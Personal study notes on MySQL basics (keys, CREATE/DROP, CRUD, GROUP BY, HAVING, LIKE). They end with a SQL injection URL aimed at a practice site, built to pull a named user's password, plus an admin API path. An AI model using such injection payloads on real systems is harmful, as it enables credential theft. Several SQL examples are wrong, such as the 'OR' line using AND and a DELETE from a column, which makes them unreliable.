# TYPES OF DATBASES
- relational: stores structured data
- non-relational: stores in a non-tabular format

# KEYS
- primary: ensures that the data collected in each certain column is unique
- foreign: columns that exist in 2+ databases, which provide a link between the two tables

# TO SET UP MySQL
$ mysql -u root -p


# DATABASE AND TABLE STATEMENTS
** all of this is in mysql> 
** apparently all of the sql commands are case insensitive
- to create database: $ CREATE DATABASE database_name;
- to show databases: $ SHOW DATABASES;
- to use database: $ USE database_name;
- to drop database: $ DROP database database_name
- to create table: $ CREATE TABLE example_table_name (
 example_column1 data_type,
 example_column2 data_type,
 example_column3 data_type
 );
- to show table: $ SHOW TABLES;
- to see what columns and their datatypes are contained w/in a table: $ DESCRIBE table_name ; 
- alter a table: $ ALTER TABLE table_name;
- drop a table: $ DROP TABLE table_name;


# CRUD (Create, Read, Update, Delete)
** use table
- create new records: $ INSERT INTO table_name (col1, col2, col3) VALUES (value1, value2, value3);
- read table:
    + $ SELECT * FROM table_name; : * indicates that all columns should be retrieved 
    + $ SELECT col1, col2 from table_name; : selects specific columns
- update table: UPDATE table_name 
            SET row1 = "text" WHERE factor = smth;
- delete smth from table: DELETE FROM col1 where factor = smth;

# CLAUSES
- use DISTINCT clause to only return unique values: $ SELECT DISTINCT col1 FROM table_name
- use GROUP BY clause to aggregate data (col0 | 2, col1 | 3, col2 | 5): $ SELECT col1, COUNT(*) FROM table_name GROUP BY col1;
- use ORDER BY clause to sort reecords in query (ASC or DESC): $ SELECT * FROM table_name ORDER BY col1 ASC;
- use HAVING clause to filter: $ SELECT col1, COUNT(*) FROM table_name GROUP BY col2 HAVING col2 LIKE 'text';


# OPERATORS
- LIKE operator: $ SELECT * FROM table_name WHERE col1 LIKE "regex"
- OR: SELECT * FROM table_name WHERE col1 = "actualText1" AND col2 = "actualText2";
- NOT: $ SELECT * FROM table_name WHERE NOT col1 LIKE "regex"
- BETWEEN: $ SELECT * FROM table_name WHERE col1 BETWEEN factor ad factor
- 




https://hack-yourself-first.com/CarsByCylinders?Cylinders=V6' AND 1=(SELECT TOP 1 password FROM userprofile WHERE email='cyber1020@gmail.com');--

https://hack-yourself-first.com/api/admin/users







